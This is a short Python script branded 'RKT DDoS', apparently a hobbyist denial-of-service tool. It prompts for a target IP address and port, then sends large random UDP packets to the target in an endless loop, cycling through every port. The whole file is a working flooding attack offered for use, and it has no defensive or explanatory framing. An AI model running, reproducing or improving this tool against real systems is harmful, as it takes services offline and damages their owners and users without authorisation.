import os
import sys
import socket
import random

os.system("clear")

print(chr(27)+"[36m")
import pyfiglet

rkt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(51200)


banner = pyfiglet.figlet_format("RKT DDoS", font = "bulbhead")
print (banner)

print

print ("    Author : Rahat Khan Tusar(RKT)")
print ("    Github : https://github.com/r3k4t")

print

ip   = raw_input("IP Target : ")
port = input    ("Port      : ")

sent = 0

while True:
     rkt.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     print "SENT %s PACKET TO %s THROUGHT PORT:%s" % (sent,ip,port)
     if port == 65535:
       port = 1
